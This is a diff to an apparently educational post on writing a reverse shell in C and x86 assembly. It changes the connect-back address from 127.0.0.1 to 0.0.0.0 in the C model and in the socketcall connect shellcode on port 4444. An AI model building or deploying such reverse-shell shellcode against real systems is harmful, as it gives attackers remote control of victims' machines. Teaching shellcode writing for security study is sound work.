@@ -25,7 +25,7 @@ As we did with the bind shell, let's start with a c model:
 
 int main() {
 	int port = 4444;
-	const char *host = "127.0.0.1";
+	const char *host = "0.0.0.0";
 	int sockfd;
 	struct sockaddr_in sockaddr;
 
@@ -94,10 +94,10 @@ _start:
         ; eax = 0x66 (socketcall)
         ; ebx = 0x3 (connect)
         ; ecx = esp
-        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x7f000001|
+        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x00000000|
         ;           sockfd      addr      addrlen  AF_INET  port   ipaddr
 
-	push 0x0100007f		; ipaddr, 127.0.0.1
+	push 0x00000000		; ipaddr, 0.0.0.0
 	push word 0x5c11	; port, 4444
 	push word 0x2		; AF_INET
 	mov ecx, esp
